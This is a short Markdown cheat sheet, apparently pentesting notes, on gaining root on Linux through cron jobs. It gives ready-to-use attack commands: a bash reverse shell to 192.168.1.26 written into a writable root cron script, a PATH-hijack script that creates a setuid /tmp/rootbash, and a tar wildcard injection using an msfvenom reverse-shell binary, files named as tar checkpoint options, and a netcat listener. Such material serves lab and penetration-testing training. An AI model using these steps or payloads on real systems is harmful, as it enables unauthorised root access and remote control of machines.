# Cronjobs

Cron table files (crontabs) store the configuration for cron jobs.

## Location

```bash
User crontabs are usually located at
/var/spool/cron/
or
/var/spool/cron/crontabs/

System-wide crontab is located at
/etc/crontab
```

Example:

```bash
cat /etc/crontab
...
* * * * * root overwrite.sh
* * * * * root /usr/local/bin/compress.sh
```

## File Permission

Cronjobs that run as root and we can write to that directory?

Add a bash reverse shell in the file:

```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.1.26/53 0>&1
```

## PATH Environment Variable

The crontab PATH environment variable is by default set to `/usr/bin:/bin`

If a program/script does not use absolute path create a script with the same name as the cronjob in the first directory the path look for the files.

Example: `PATH=/home/user/:/usr/local/sbin:/bin`

### Exploit

```bash
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
```

Make sure the script is executable:

```bash
chmod +x overwrite.sh
```

Wait for the cronjob, get a root shell:

```bash
/tmp/rootbash -p
```

## Wildcards

Abusing TAR arguments.

Cronjob file:

```bash
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

### Exploit

Generate a reverse shell using msvenom:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.x LPORT=1234 -f elf -o shell.elf
```

Copy the file to the /home/user directory and make it executable:

```bash
chmod +x /home/user/shell.elf
```

Create two files in the /home/user directory:

```bash
touch /home/user/--checkpoint=1 
touch /home/user/--checkpoint-action=exec=shell.elf
```

Start a netcat listener and wait for the cronjob:

```bash
nc -lnvp 1234
```